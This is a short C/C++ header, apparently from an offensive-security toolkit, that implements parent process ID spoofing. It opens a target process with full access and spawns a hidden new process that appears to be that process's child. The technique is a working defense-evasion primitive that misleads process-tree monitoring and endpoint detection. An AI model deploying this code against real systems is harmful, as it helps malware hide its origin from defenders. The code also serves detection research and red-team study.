/*
	File: ProcessSpoofing.h
	Author: @S1ckB0y1337
	License: MIT License
*/

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

//Spawns a new instance of a specified application with its Parent Process ID Spoofed with the provided PPID
void spoofParent(DWORD ppid, LPCSTR prog, LPSTR args) {
	SIZE_T threadAttributeSize = NULL;
	STARTUPINFOEXA startupInfo;
	PROCESS_INFORMATION processInformation;
	//Zeroing out memory for the two structures that will hold our new process info
	SecureZeroMemory(&startupInfo, sizeof(STARTUPINFOEXA));
	SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	//Set the size of the structure
	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	//Lets open the process of the specified PID
	printf("[+]Target PID: %d\n", ppid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, ppid);
	if (hProcess == NULL) {
		printf("OpenProcess() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]OpenProcess() succeed!\n");
	//Lets initializes the specified list of attributes for process and thread creation
	//Calling the function ones to get the bytes we need to reserve
	InitializeProcThreadAttributeList(NULL, 1, 0, &threadAttributeSize);
	printf("[*]Initializing Process Attributes\n");
	//Lets reserve the bytes for the required size
	startupInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(threadAttributeSize);
	//After getting the size and reserved the bytes we will initialize the Structure properly
	if (!InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, &threadAttributeSize)) {
		printf("InitializeProcThreadAttributeList() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	//Now lets update the Attribute list of the STARTUPINFOEXA structure
	if (!UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("UpdateProcThreadAttribute() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[*]Spawning Process with Spoofed Parent\n");
	//And finally lets create the process
	if (CreateProcessA(prog, args, NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&startupInfo), &processInformation) == 0) {
		printf("CreateProcessA() error : % u\n", GetLastError());
		ExitProcess(-1);
	}
	printf("[+]Proccess spawned with PID: %d\n", processInformation.dwProcessId);
	//Close handles
	CloseHandle(hProcess);
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
}